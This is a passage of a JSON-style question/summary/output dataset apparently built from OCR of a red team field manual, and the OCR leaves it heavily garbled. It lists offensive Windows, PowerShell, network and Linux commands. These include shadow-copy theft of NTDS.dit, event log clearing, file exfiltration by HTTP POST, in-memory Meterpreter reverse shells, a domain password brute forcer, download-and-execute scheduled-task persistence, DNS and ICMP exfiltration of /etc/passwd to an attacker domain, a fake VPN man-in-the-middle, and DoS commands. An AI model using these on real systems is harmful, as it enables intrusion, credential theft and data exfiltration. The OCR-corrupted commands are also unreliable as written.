m\"ih2ci$$i\n\nVOLUME SHADOW COPY\n1. wmic /node: DC IP /user:\"DOI1AIN\\user\" /password:\"PASS11 process\ncall create \"cmd /c vssadmin list shadows 2 &1\nc:\\temp\\output.txt\"\nIf anJ copies alread1 ex~st then exfil, otherwise create using\nfollowing commands. Check output.txt for anJ errors\n2. wmic /node: DC IP /Jser:11D0l1AIN\\u.ser\" /password:11PASS11 process\ncall create \"cmd /c vssadmin create shadow /for=C: 2 &1\nC:\\temp\\output.txt\"\n3. wmic /node: DC IP /user:11DOHAIN\\user\" /password:\"PASS\" process\ncall create \"cmd /c copJ\n\\\\?\\GLOBALROOT\\Device\\HarddiskVol~meShadowCopy1\\Windows\\System32\\co\nnfig\\SYSTEM C:\\temp\\system.hive 2 &1 C:\\temp\\output.txt\"\n4. wmic /node: DC IP /user: \"DOl'.llUN\\user\" /password: 11PASS\" process\ncall create ''crnd /c copJ\n\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyc\\NTDS\\NTDS.dit\nC:\\temp\\ntds.dit 2 &1 C:\\temp\\output.txt\"\nStep bj step instructions o~ roorn362.com for step below\n5. From Linux, download and run ntdsxtract and libesedb to export\ntashes or other domain information\na. Additional instructions found under the VSSOW~ section\nb. ntdsx~ract- http://www.ntdsxtract.com\nc. libesedb- http://code.google.com/p/libesedb/\n21\n\nPOWERS HELL\nget-content file displaJs file contents\nget-help command -examples Shows examples of command\nget-command ' string ' Searches for cmd string\nget-service Displajs services (stop\nservice, start-service)\nget-wmiobject -class win32 service Displays services, but takes\nalternate credentials\n$PSVesionTable DisplaJ powershell version\npowershell.exe -version 2.0 Run powershell 2.0 from 3.0\nget-service measure-object Returns # of services\nget-psdrive Returns list of PSDrives\nget-process select -expandproperty name Returns only names\nget-help ' -parameter credential Cmdlets that take creds\nget-wmiobject -list -'network Available WMI network cmds\n(Net.DNS]: :GetnostEntry(\" ip \"I DNS Lookup\nCLEAR SECURITY & APPLCIATION EVENT LOG FOR REMOTE SERVER(S~Ol)\nGet-EventLog -list\nClear-EventLog -logname Application, Security -computername SVR01\n\nEXPORT OS INFO INTO CSV FILE\nGet-WmiObject -class win32 operatingsjstem I select -property 1 1 export\ncsv c:\\os.txt\n\nLIST RUNNING SERVICES\nGet-Service I where object {$ .status -eq ''Running''}\n\nPERSISTENT PSDRIVE TO REMOTE FILE SHARE:\nNew-PSJrive -Persist -PSProvider FileSjstem -Root \\\\1.1.1.1\\tools -Name i\nRETURN FILES WITH WRITE DATE PAST 8/2 0\nGet-Childitem -Path c:\\ -Force -Rec~rse -Filter '.log -ErrorAction\nSilentl~Con~inue I where {$ .LastWriteTime -gt ''2012-08-20''}\n\nFILE DOWNLOAD OVER HTTP\n(new-object sjstem.net.webclient) .downloadFile(''url'',''dest'')\nTCP PORT CONNECTION (SCANNER)\n$ports=(#,#,#) ;$ip=\"x.x.x.x\";foreach ($port in $ports) {trJ($socket=New\nobject Sjste~.Net.Sockets.TCPClient($ip,$port); }catch(};if ($socket -eq\n$NULL) (echo $ip\":\"$port\"- Closed\";}else(echo $ip\":\"$port\"- Open\";$socket\n=$NULL;}}\n\nPING WITH 500 MILLISECOND TIMEOUT\n$ping = New-Object Sjstex.Net.Networkinformation.ping\n$ping.Send('' ip '',5JO)\n22\n\nBASIC AUTHENTICATION POPUP\npowershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass\n$Host.UI.PromptForCredential(11 title \",11 message 11111 user\" 11 domain\")\nRUN EXE EVERY 4 HOURS BETWEEN AUG 8-11 , 2 013 AND THE HOURS OF\n0800-1700 (FROM CMo. EXE)\npowershell. exe -Command \"do {if ((Get-Date -format yyyyl1l1dd-HHmm) -match\n'201308 ( 0 [ 8-9] 11 [0-1])-I 0 [ 8-9] 11 [ o-c]) [ 0-5] [ 0-9]') {Start-Process -\nWindowStyle Hidden \"C:\\Temp\\my.exe\";Start-Sleep -s 14400))while(1)\"\n\nPOWERSHELL RUNAS\n$pw ~ convertto-securestring -string \"PASSWORD\" -asplaintext -force;\n$pp ~ new-object -typename System.Management.Automation.PSCredential -\nargument list \"DOl1AIN\\user11, $pw;\nStart-Process powershell -Credential $pp -ArgumentList '-noprofile -command\n&{Start-Process file.exe -verb runas)'\n\nEMAIL SENDER\npowershell.exe Send-l-1ai1Hessage -to \" email \" -from \" email \" -subject\n\"Subject11 -a \" attachment file path \" -body \"Body\" -SmtpServer Target\nEmail Server IP\nTURN ON POWERSHELL REMOTING (WITH VALID CREDENTIALS)\nnet time \\\\ip\nat \\\\ip time \"Powershell -Command 'Enable-PSRemoting -Force'\"\nat \\\\ip time+1 \"Powershell -Command 'Set-Item\nwsman:\\localhost\\client\\trustedhosts ''\"\nat \\ \\ip time+2 \"Powershell -Command 'Restart-Service WinRl-1'\"\nEnter-PSSession -ComputerName ip -Credential username\n\nLIST HOSTNAME AND IP FOR ALL DOMAIN COMPUTERS\nGet-WmiObject -ComputerName DC -Namespace root\\microsoftDNS -Class\nl1icrosoftDNS _ ResourceRecord -Filter \"domainname~' DOl1AIN '\" I select\ntextrepresentation\n\nPOWERSHELL DOWNLOAD OF A FILE FROM A SPECIFIED LOCATION\npowershell.exe -noprofile -noninteractive -command\n\"[System.Net.ServicePointManager] ::ServerCertificateValidationCallback\n{$true); $source~\"\"\"https:ll YOUR SPECIFIED IP I file.zip \"\"\";\n$destination=111111C:\\rnaster.zip111111;-$http = new-object Systern.Net.WebClient;\n$response~ $http.DownloadFile($source, $destination);\"\n\nPOWERSHELL DATA EXFIL\nScript will send a file ($filepath) via http to server ($server) via POST\nrequest. Must have web server listening on port designated in the $server\npowershell.exe -noprofile -noninteractive -command\n\"[S;stem.Net.ServicePointManager] ::ServerCertificateValidationCallback\n{$true); $server~\"\"\"http:ll YOUR SPECIFIED IP I folder \"\"\";\n$filepath=\"1111C:\\rnaster.zip111111i $http= new=object System.Net.WebClient;\n$response~ $http.UploadFile($server,$filepath);\"\n23\n\nUSING POWERSHELL TO LAUNCH METERPRETER FROM MEMORY\n~ Need Metasploit v4.5+ (msfvenom supports Powershell)\n~ Use Powershell (x86) with 32 bit Meterpreter payloads\n~ encodeMeterpreter.psl script can be found on next page\n\nON ATTACK BOXES\n1. ./msfvenom -p Wlndows/meterpreter/reverse https -f psh -a x86\nLHOST=l.l.l.l LPORT=443 audit.psl\n2. Move audit.psl into same folder as encodeMeterpreter.psl\n3. Launch Powershell (x86)\n4. powershell.exe -executionpolicy bypass encodeMeterpreter.psl\n5. Copy the encoded Meterpreter string\n\nSTART LISTENER ON ATTACK BOX\n1. ./msfconsole\n2. use exploit/multi/handler\n3. set payload windows/meterpreter/reverse https\n4. set LHOST 1. 1. 1. 1\n5. set LPORT 443\n6. exploit -j\nON TARGET (MUST USE POWERSHELL (x86))\n1. powershell. exe -noexi t -encodedCommand paste encoded t~eterpreter\nstring here\n\nPROFIT\nENCODEMETERPRETER. PSl [7]\n# Get Contents of Script\n$contents = Get-Content audit.psl\n# Compress Script\n$ms = New-Object IO.MemoryStream\n$action = [IO.Compression.CompressionMode]: :Compress\n$cs =New-Object IO.Compression.DeflateStream ($ms,$action)\n$sw =New-Object IO.StreamWriter ($cs, [Text.Encoding] ::ASCII)\n$contents I ForEach-Object {$sw.WriteLine($ I)\n$sw.Close()\n# Base64 Encode Stream\n$code= [Convert]: :ToBase64String($ms.ToArray())\n$command= \"Invoke-Expression '$(New-Object IO.StreamReader('$(New-Object\nIO. Compression. DeflateStream ('$(New-Object IO. t4emoryStream\n(, '$ ( [Convert] : : FromBase64String ('\"$code'\") ) I I ,\n[IO.Compression.Compressiont~ode]: :Decompress) I,\n[Text.Encoding]: :ASCII)) .ReadToEnd() ;\"\n# Invoke-Expression $command\n$bytes= [System.Text.Encoding] ::Unicode.GetBytes($command)\n$encodedCommand = [Convert]: :ToBase64String($bytes)\n# Write to Standard Out\nWrite-Host $encodedCommand\nCopyright 2012 TrustedSec, LLC. All rights reserved.\nPlease see reference [7] for disclaimer\n24\nUSING POWERSHELL TO LAUNCH METERPRETER (2ND METHOD)\n\nON BT ATTACK BOX\n1. rnsfpajload windows/rneterpreter/reverse tcp LHOST~10.1.1.1\nLPORT~8080 R I rnsfencode -t psh -a x86\n\nON WINDOWS ATTACK BOX\n1. c:\\ powershell\n2. PS c:\\ $crnd ~ ' PASTE THE CONTENTS OF THE PSH SCRIPT HERE '\n3. PS c:\\ $u ~ [Sjstern.Text.Encoding]: :Unicode.GetBytes($crnd)\n4. PS c: \\ $e ~ [Convert] ::ToBase64String($u)\n5. PS c:\\ $e\n6. Copf contents of $e\n\nSTART LISTENER ON ATTACK BOX\n1. ./rnsfconsole\n2. use exploit/multi/handler\n3. set pajload windows/rneterpreter/reverse tcp\n4. set LHOST 1.1.1.1\n5. set LPORT 8080\n6. exploit -j\nON TARGET SHELL ( 1 : DOWNLOAD SHELLCODE, 2 : EXECUTE)\n1. c: \\ powershell -noprofile -noninteracti ve -command \" &\n{$client~new-object\nSjstern.Net.WebClient;$client.DownloadFile('http://1.1.1.1/shell.txt\n', 'c:\\windows\\ternp\\ shell.txt') )\"\n2. c: \\ powershell -noprofile -noninteracti ve -noexi t -command 11 &\n{$crnd~tjpe 'c:\\windows\\ternp\\ shell.txt';powershell -noprofile\nnoninteractive -noexit -encodedCornmand $cmd}11\n\nPROFIT\n25\n\nWINDOWS REGISTRY\n\nOS INFORMATION\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\n\nPRODUCT NAME\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion /v\nProductNarne\n\nDATE OF INSTALL\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion /v InstallDate\n\nREGISTERED OWNER\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion /v RegisteredOwner\n\nSYSTEM ROOT\nHKLM\\Software\\~icrosoft\\Windows NT\\CurrentVersion /v SjstemRoot\nTIME ZONE (OFFSET IN MINUTES FROM UTC)\nHKLM\\Sjstem\\CurrentControlSet\\Control\\TimeZoneinformation /v ActiveTirneBias\n\nMAPPED NETWORK DRIVES\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Map Network Drive\nMRU\nMoUNTED DEVICES\nHKLM\\Sjstern\\MountedDevices\n\nUSB DEVICES\nHKLM\\Sjstern\\CurrentControlSet\\Enurn\\USBStor\n\nTURN ON IP FORWARDING\nHKEY_LOCAL_~ACHI~E\\SYSTEM\\CurrentControlSet\\Services\\Tcp~p\\Parameters -\nIPEnableRouter = 1\n\nPASSWORD KEYS : LSA SECRETS CAN CONTAIN VPN AUTOLOGON OTHER\n1 1\n\nPASSWORDS\nHKEY LOCAL MACHINE\\Securitj\\Policy\\Secrets\nHKCU\\Soft\\v~re \\t1icroso ft \\Windows NT\\CurrentVersion \\Winlogon \\autoadminlogon\n\nAUDIT POLICY\nHKLM\\Security\\Policj\\?olAdTev\n26\nKERNEL/USER SERVICES\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentControlSet\\Services\n\nINSTALLED SOFTWARE ON MACHINE\nHKLt1\\Software\n\nINSTALLED SOFTWARE FOR USER\nHKCU\\Software\n\nRECENT DOCUMENTS\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\n\nRECENT USER LOCATIONS\nHKCU\\Software\\Microsoft\\Windows\\Curren~Version\\Explorer\\ComDlg32\\LastVisite\ndtmu & \\Opensavetmu\nTYPED URLs\nHKCU\\Software\\Microsoft\\Internet Explorer\\TjpedURLs\n\nMRU LISTS\nHKCU\\ Software \\:ci erose ft \\Windows\\ Cur rentVer s ion\\ Explorer \\Runt1RU\n\nLAST REGISTRY KEY ACCESSED\nHKCU\\Software\\l1icrosoft\\Windows\\CurrentVersion\\Applets\\RegEdit /v LastKeJ\n\nSTARTUP LOCATIONS\nHKLl1\\Soft'..;are \\t1icroso:t \\1/'Jindows \\CurrentVers on \\Run & \\Runonce\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVers on\\Policies\\Explorer\\Run\nHKCU\\Software\\Microsoft\\Windows\\CurrentVers on\\Run & \\Runonce\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load & \\Run\n2-\n\nENUMERATING WINDOWS DOMAIN WITH DSQUERY\n\nLIST USERS ON DOMAIN WITH NO LIMIT ON RESULTS\ndsquery user -limit 0\nLIST GROUPS FOR DOMAIN=VICTIM.COM\ndsquery group ''cn=users, dc=victim, dc=com''\n\nLIST DOMAIN ADMIN ACCOUNTS\ndsquerj group -name \"domain admins 11 i. dsget group -members -expand\n\nLIST ALL GROUPS FOR A USER\ndsquery user -name bob1 I dsget user -memberof -expand\nGET A USER'S LOGIN ID\ndsquerj user -name bob~ i dsget user -samid\n\nLIST ACCOUNTS INACTIVE FOR 2 WEEKS\ndsquery user -inactive 2\n\nADD DOMAIN USER\ndsadd user ''CN=Bob,CN=Users,DC=victim,DC=corn'' -samid bob -pwd bobpass\ndisplaj \"Bob11 -pwdneverexpires jes -rnemberof \"CI';=Domain\nAdmins,CN=Users,DC=victim,DC=com\n\nDELETE USER\ndsrm -subtree -noprornpt ''CN=Bob,CN=Users,DC=victim,DC=com''\n\nLIST ALL OPERATING SYSTEMS ON DOMAIN\ndsquerJ A ''DC=victim,DC=com'' -scope subtree -attr ''en'' ''operati~gSjstern''\n''operatingSjstemServicePack'' -filter\n11 (& (objectclass=computer) (objectcategorJ=computer) (operatingSjstem=Windows}\nI I\"\n\nLIST ALL SITE NAMES\ndsquerJ site -o rdn -l~mit\n\nLIST ALL SUBNETS WITHIN A SITE\ndsquery subnet -site sitename -o rdn\n\nLIST ALL SERVERS WITHIN A SITE\ndsquerJ server -site sitename -o rdn\n28\n\nFXND SERVERS XN THE DOMAIN\ndsquery ' domainroot -filter\n\" (& (objectCategory~Computer) (objectClass~Computer) (operatingSystem~'Server'\n) ) \" -limit 0\n\nDOMAIN CONTROLLERS PER SXTE\ndsquery J ''CN=Sites,CN=Configuration,DC=forestRootDomain'' -filter\n(objectCategory~Server)\n29\n\nWINDOWS SCRIPTING\n) If scripting in batch file, variables must be preceeded with %%, i.e. %%i\n\nNESTED FOR LOOP PING SWEEP\nfor /L %i in (10,1,254) do@ (for /L %x in (10,1,254) do@ ping -n 1 -w 100\n\n10.10.%i.%x 2 nul 1 find \"Reply\" && echo 10.10.%i.%x live.txt)\n\nLOOP THROUGH FILE\nfor /F %i in I file I do command\n\nDOMAIN BRUTE FORCER\nfor /F %n in (names.txt) do for /F %pin (pawds.txt) do net use \\\\DC01\\IPC$\n/user: domain \\%n %p 1 NUL 2 &1 && echo %n:%p && net use /delete\n\\\\DCOl\\IPC$ NUL\nACCOUNT LOCKOUT (LOCKOUT. BAT)\n@echo Test run:\nfor /f %%U in (list.txt) do @for /1 %%C in (1,1,5) do @echo net use \\\\WIN-\n1234\\c$ /USER:%%U wrongpass\n\nDHCP EXHAUSTION\nfor /L %i in (2,1,254) do (netsh interface ip set address local static\n\n1.1.1.%i netrnask gw I~ %1 ping 12-.0.0.1 -n l -w 10000 nul %1)\n\nDNS REVERSE LOOKUP\nfor /L %i in (100, 1, 105) do @ nslookup l.l.l.%i I findstr /i /c:''Name''\ndns.txt && echo Server: 1.1.1.%i dns.txt\n\nSEARCH FOR FILES BEGINNING WITH THE WORD 11PASS11 AND THEN PRINT IF\nIT 1 S A DIRECTORY, FILE DATE/TIME, RELATIVE PATH, ACTUAL PATH AND\nSIZE (@VARIABLES ARE OPTIONAL)\nforfi1es /P c:\\ternp /s /rn pass' -c \"crnd /c echo @isdir @fdate @ftirne\n@relpath @path @fsize\"\nSIMULATE MALICIOUS DOMAIN CALLOUTS (USEFUL FOR AV/IDS TESTING)\nRun packet capture on attack domain to receive callout\ndomains.txt should contain known malicious domains\nfor /L %i in (0,1,100) do (for /F %n in (domains.txt) do nslookup %n\nattack domain NUL 2 &1 & ping -n 5 12-.0.0.1 NUL 2 &1\nIE WEB LOOPER (TRAFFIC GENERATOR)\nfor /L %C in (1,1,5000) do @for %U in (www.Jahoo.com www.pastebin.com\nwww.pajpal.com www.craigslist.org www.google.com) do start /b iexplore %U &\nping -n 6 localhost & taskkill /F /IM iexplore.exe\n38\ntlai/)' rnrt Y\" -7 - _,"
  },
  {
    "input": "What are the key methods and commands discussed for gaining elevated permissions, executing tasks, and managing network services and configurations in the context of Windows and Cisco systems?",
    "summary": "The text provides commands for gaining permissions on service executables, initiating a rolling reboot, and using VBScript to escalate shell access. It also explains how to create scheduled tasks for persistence, lists common ports and IP ranges, and includes Cisco commands and SNMP tools for network reconnaissance and exploitation. Additionally, it covers subnetting and packet capturing techniques for network analysis.",
    "output": "GET PERMISSIONS ON SERVICE EXECUTABLES\nfor /f ''tokens=2 delims='=''' %a in ('wmic service list full lfind /i\n''pathname'' I find /i /v ''s~stem32''') do @echo %a\nc:\\windows\\temp\\3afd4ga.tmp\nfor /f eol = '' delims = '' %a in (c:\\windows\\temp\\3afd4ga.tmp) do cmd.exe\n/c icacls ''%a''\nROLLING REBOOT (REPLACE /R WITH /S FOR A SHUTDOWN) :\nfor /L %i in (2,1,254) do shutdown /r /m \\\\l.l.l.%i /f /t 0 /c \"Reboot\nmessage''\nSHELL ESCALATION USING VBS (NEED ELEVATED CREDENTIALS)\n# Create .vbs script with the following\nSet shell ' wscript.createobject(''wscript.shell'')\nShell.run ''runas /user: user '' & '''''''' &\nC:\\Windows\\SJstem32\\WindowsPowershell\\vl.O\\powershell.exe -WindowStJle\nhidden -NoLogo -~onlnteractive -ep bjpass -nop -c \\'' & '''''''' & ''IEX ((New-\nObject Net.WEbClieil':).down:oadstring(' url '))\\\" & \"\"\"\" & \"\"\"\"\nwscript.sleep (100)\nshell.Sendkejs '' password '' & ''{ENTER}''\n31\n\nTASK SCHEDULER\n' Scheduled tasks binary paths CANNOT contain spaces because everjthing\nafter the first space in the path is considered to be a command-line\nargument. Enclose the /TR path parameter between backslash (\\) AND\nquotation marks (\"):\n... /TR \"\\\"C:\\Program Files\\file.exe\\\" -x argl\"\nTASK SCHEDULER (ST=START TIME, SD=START DATE, ED=END DATE)\n*MUST BE ADMIN\nSCHTASKS /CREATE /TN Task Name /SC HOURLY /ST HH:MM /F /RL HIGHEST /SD\nMM/DD/YYYY /ED l1M/DD/YYYY /tr \"C:\\mj.exe\" /RU DOl1AIN\\ user /RP\npassword\nTASK SCHEDULER PERSISTENCE [10]\n'For 64 bit use:\n\"C:\\Windows\\sjswow64\\WindowsPowerShell\\vl.O\\powershell.exe\"\n# (x86) on User Login\nSCHTASKS /CREATE /TN Task Name /TR\n\"C:\\Windows\\System32\\WindowsPowerShell\\vl.O\\powershell.exe -WindowStyle\nhidden -NoLogo -Noninteractive -ep bypass -nap -c 'IEX ((new-object\nnet.webclient) .downloadstring( ''http:// ip : port I payload'''))'\" /SC\nonlogon /RU System\n# (x86) on System Start\nSCHTASKS /CREATE /TN Task Name /TR\n\"C:\\Windows\\System32\\WindowsPowerShell\\vl.O\\powershell.exe -WindowStjle\nhidden -NoLogo -Noninteractive -ep bypass -nap -c 'IEX ((new-object\nnet.webclient) .downloadstring(''http:// ip : port I payload'''))'\" /SC\nonstart /RU System\n# (x86) on User Idle (30 Minutes)\nSCHTASKS /CREATE /TN Task Name /TR\n\"C:\\Windows\\System32\\WindowsPowerShell\\vl.O\\powershell.exe -WindowStyle\nhidden -NoLogo -Noninteractive -ep bjpass -nop -c 'IEX ((new-object\nnet.webclient) .downloadstring(''http:// ip : port I payload'''))'\" /SC\nonidle /i 30\n32\n\nCOMMON PORTS\n21 FTP 520 RIP\n22 SSH 546r DHCPv6\n23 Tel net 58- St1TP\n25 St1TP 902 Vt1Ware\n49 TACACS 1080 Socks Proxy\n53 DNS 1194 VPN\n6-;s DHCP (UDP) 1433/4 t1S-SQL\n69 TFTP (UDP) 1521 Oracle\n80 HTTP 1629 DarneWare\n88 Kerberos 204 9 NFS\n110 POP3 3128 Squid Proxy\n111 RPC 3306 t1ySQL\n123 NTP (UDP) 3389 RDP\n135 Windows RPC 5060 SIP\n13- NetBIOS 5222 Jabber\n138 NetBIOS 5432 Postgres\n139 Sl1B 5666 Nagios\n143 Il1AP 5900 VNC\n161 SNHP (UDP) 6000 X11\n1-9 BGP 6129 DameWare\n201 AppleTalk 666- IRC\n389 LDAP 9001 Tor\n443 HTTPS 9001 HSQL\n445 SHE 9090/1 Open fire\n500 ISAKt1P (UDP) 9100 Jet Direct\n514 Sjslog\n\nTTL FINGERPRINTING\nWindows : 128\nLinux : 64\nNetwork : 255\nSolar is : 255\n35\nIPv4\n\nCLASSFUL IP RANGES\nA 0.0.0.0 - 12\".255.255.255\n\nB 128.0.0.0 - 191.255.255.255\nc 192.0.0.0 - 223.255.255.255\n\nD 224.0.0.0- 239.255.255.255\n\nE 240.0.0.0 - 255.255.255.255\n\nRESERVED RANGES\n\n10.0.0.0 - 10.255.255.255\n12?.0.0.0 - 12'.255.255.255\n\n172.16.0.0 - 1-2.31.255.255\n\n192.168.0.0 - 192.168.255.255\n\nSUBNETTING\n/31 255.255.255.254 1 Host\n/30 255.255.255.252 2 Hosts\n/29 255.255.255.248 6 Hosts\n/28 255.255.255.240 14 Hosts\n/2\" 255.255.255.224 30 Hosts\n/26 255.255.255.192 62 Hosts\n/25 255.255.255.128 126 Hosts\n/24 255.255.255.0 254 Hosts\n/23 255.255.254.0 510 Hosts\n/22 255.255.252.0 1022 Hosts\n/21 255.255.248.0 2046 Hosts\n/20 255.255.240.0 4094 Hosts\n/19 255.255.224.0 8190 Hosts\n/18 255.255.192.0 16382 Hosts\n/17 255.255.128.0 32?66 Hosts\n/16 255.255.0.0 65534 Hosts\n/15 255.254.0.0 1310\"0 Hosts\n/14 255.252.0.0 262142 Hosts\n/13 255.248.0.0 524286 Hosts\n/12 255.240.0.0 1048574 Hosts\n/11 255.224.0.0 209-150 Hosts\n/10 255.192.0.0 4194302 Hosts\n/9 255.128.0.0 8388606 Hosts\n/8 255.0.0.0 16\"'\"214 Hosts\n\nCALCULATING SUBNET RANGE\nGiven: 1.1.1.101/28\n~ /28 = 255.255.255.240 netmask\n~ 256 - 240 = 16 = subnet ranges of 16, i.e.\n\n1.1.1.0\n\n1.1.1.16\n\n1.1.1.32 ...\n~ Range where given IP falls: 1.1.1.96 - 1.1.1.111\n36\nIPv6\n\nBROADCAST ADDRESSES\nff02::1- link-local nodes\nff05::1- site-local nodes\nff01::2- node-local routers\nff02::2- link-local routers\nff05::2- site-local routers\n\nINTERFACE ADDRESSES\nfe80:: -link-local\n2001:: - routable\n::a.b.c.d- IPv4 compatible IPv6\n::ffff:a.b.c.d- IPv4 mapped IPv6\nTHC IPv6 TOOLKIT\nRemote Network DoS:\nrsumrf6 eth# remote ipv6\nSOCAT TUNNEL IPv6 THROUGH IPv4 TOOLS\nsocat TCP-LISTEN:8080,reuseaddr,fork TCP6: [2001: :] :80\n./nikto.pl -host 12-.0.0.1 -port 8080\nr\n\nCISCO COMMANDS\n#configure terminal Configure interface\n(config)#interface fa0/0 Configure FastEthernet 0/0\n(config-if)#ip addr 1.1.1.1 255.255.255.0 Add IP to fa0/0\n(config)#line VtJ 0 4 Configure vtj line\n(config-line)#login 1. Set telnet password\n(config-line)#password password 2. Set telnet password\n#show session Open sessions\n#show version IOS version\n#dir file SJStems Available files\n#dir all-filesjstems File information\n#dir /all Deleted files\n#show running-config Config loaded in mem\n#show startup-config Config loaded at boot\n#show ip interface brief Interfaces\n#show interface eO Detailed interface info\n#show ip route Rot:tes\n#show access-lists Access lists\n#terminal length 0 No limit on output\n#copj running-config startup-config Replace run w/ start config\n#cop] running-config tftp CopJ run config to TFTP Svr\n\nCISCO IOS 11.2-12.2 VULNERABILITY\nhttp:// ip /level/ 16-99 /exec/show/config\n\nSNMP\n\nMUST START TFTP SERVER 1ST\n./snmpblow.pl -s srcip -d rtr ip -t attackerip -f out.txt\nsnmpstrings.txt\n\nWINDOWS RUNNING SERVICES:\nsnrnpwalk -c public -v1 ip 1 lgrep hrSWRJnName !cut -d\" \" -f4\n\nWINDOWS OPEN TCP PORTS :\nsmpwalk lgrep tcpConnState !cut -d\" \" -f6 !sort -u\n\nWINDOWS INSTALLED SOFTWARE:\nsmpwalk !grep hrSWinstalledName\n\nWINDOWS USERS:\nsnmpwalk ip 1.3 lgrep --.1.2.25 -f4\n38\n\nPACKET CAPTURING\n\nCAPTURE TCP TRAFFIC ON PORT 22-23\ntcpdurnp -nvvX -sO -i ethO tcp portrange 22-23"
  },
  {
    "input": "How can one capture traffic to a specific IP address while excluding a particular subnet and then replay the captured packets?",
    "summary": "The text explains how to capture traffic to specific IPs while excluding certain subnets, replay PCAP files, perform DNS reconnaissance, and set up a fake VPN server. It also covers methods for exfiltrating data using DNS and ICMP, and how to open a mail relay via telnet.",
    "output": "CAPTURE TRAFFIC TO SPECIFIC IP EXCLUDING SPECIFIC SUBNET\ntcpdurnp -I ethO -tttt dst ip and not net 1.1.1.0/24\nCAPTURE TRAFFIC B/W LOCAL-192 .1\ntcpdurnp net 192.1.1\nCAPTURE TRAFFIC FOR <SEC> SECONDS\ndurnpcap -I ethO -a duration: sec -w file file.pcap\n\nREPLAY PCAP\nfile2cable -i ethO -f file.pcap\nREPLAY PACKETS (rozz 1 DoS)\ntcpreplaj --topspeed --loop=O --intf=ethO .pcap_file_to replaj\nrnbps=l0110011000\nDNS\n'\n•\n\nDNSRECON\nReverse lookup for IP range:\n./dnsrecon.rb -t rvs -i 192.1.1.1,192.1.1.20\nRetrieve standard DNS records:\n./dnsrecon.rb -t std -d dornain.corn\nEnumerate subdornains:\n./dnsrecon.rb -t brt -d dornain.corn -w hosts.txt\nDNS zone transfer:\n./dnsrecon -d dornain.corn -t axfr\nNMAP REvERSE DNS LOOKUP AND OUTPUT PARSER\nnrnap -R -sL -Pn -dns-servers dns svr ip range I awk '{if( ($1\" \"$2\"\n\"$3)==\"Nrnap scan report\")print$5\" \"$6}' I sed 's/(//g' I sed 's/)//g'\ndns.txt\n39\nVPN\n\nWRITE PSK TO FILE\nike-scan -M -A vpn ip -P file\nDoS VPN SERVER\nike-scan -A -t 1 --sourceip= spoof ip dst ip\n\nFIKED - FAKE VPN SERVER\n~ Must know the VPN group name a~d pre-shared ke;\n1. Ettercap filter to drop IPSEC traffic IUDP port 5001\niflip.proto == UDP && udp.scc == 5001 I\nkill I I;\ndrop I I;\nmsg (\"-' ' ' ' 'UDP packet dropped 1 > ' ' -1 \") ;\n2. Compile filter\netterfilter udpdrop.filter -o udpdrop.ef\n3. Start Ettercap and drop all IPSEC ~raffic\n#ettercap -T -g -M arp -F udpdrop.ef II II\n4. Enable IP Forward\necho \"1\" lprocls;slnetlipv4lip_forward\n5. Configure IPtables to port forward to Fiked server\niptables -t nat -A PREROUTING -p udp -I ethO -d VPN Server IP -j\nDNAT - - to Attacking Host IP\nipcables -P FORWARD ACCEP~\n6. Start Fiked to impersonate the VPN Server\nfiked - g vpn gatewa; ip - k VPN Group Name:Group Pre-Shared Ke;\nStop Ettercap\n8. Restart Ettercap without the filter\nettercap -T -M arp II II\n\nPUTTY\nREG KEY TO HAVE PuTTY LOG EVERYTHING (INCLUDING CONVERSATIONS)\n[HKEY_CURRENT_USER\\Software\\Si~onTatham\\Putt;\\Sessions\\Default%20Settings]\n\"LogFileName\"=\"%TEMP%\\putt;.dat\"\n\"LogT;pe\"=dword:00000002\"\n40\n\nFILE TRANSFER\n\nFTP THROUGH NON-INTERACTIVE SHELL\necho open ip 21 ftp.txt\necho user ftp.txt\necho pass ftp.txt\necho bin ftp.txt\necho GET file =tp.txt\necho bfe ftp.txt\nftp -s:ftp.txt\n\nDNS TRANSFER ON LINUX\nOn victim:\n1. Hex e~code the file to be transferred\nxxd -p secret fi:e.hex\n2. Read in each line and do a D~S lookup\nforb in 'cat fole.hex '; do dig $b.shell.evilexample.com; done\nOn attacker:\n1. Capture DNS exfil packets\ntcdpump -w /tmp/dns -sO port 53 and host sjstem.example.com\n2. Cut the exfil!ed hex from t~e DNS packet\ntcpdump -r dnsdemo -n I grep shell.evilexample.com I cut -f9 -d'\ncut -fl -d'.' I uniq received. txt\n3. Reverse the hex encoding\nxxd -r -p received~.txt kefS.pgp\n\nEXFIL COMMAND OUTPUT ON A LINUX MACHINE OVER ICMP\nOn victim (never endi~g l liner) :\nstringz-·cat /etc/passwd I od -tx1 I cut -c8- I tr -d \" \" I tr -d \"\\n\"'\ncounter-0; while (($counter - ${#stringZ})} ;do ping -s 16 -c l -p\n${stringZ:$counter:16} 192.168.10.10 &&\ncounter=$( (counter+~6)) ;done\nOn attacker (capture pac~ets to data.dmp and parse}:\ntcpdump -ntvvSxs 0 'icmp[C:-a• data.dmp\ngrep Ox0020 data.dmp I cut -c21- I tr -d \" \" I tr -d \"\\n\" I xxd -r -p\n\nOPEN MAIL RELAY\nC:\\ telnet x.x.x.x 25\nHELO x.x.x.\nl1AIL FROl1: me@jou.com\nRCPT TO: fOU@;ou.com"
  },
  {
    "input": "What are the different methods and commands used to establish a reverse shell and maintain persistence on a target system?",
    "summary": "The text provides various commands for establishing reverse shells and maintaining persistence on different operating systems, including Linux, Windows, and methods using Perl, Python, Bash, Java, PHP, Ruby, and Telnet. It also includes techniques for remote payload deployment via SMB or WebDAV and instructions for setting up a socks proxy and stunnel for tunneling. Additionally, it lists Google hacking operators and examples of vulnerabilities in video conferencing systems like Polycom, Tandberg, and Sony WebCam.",
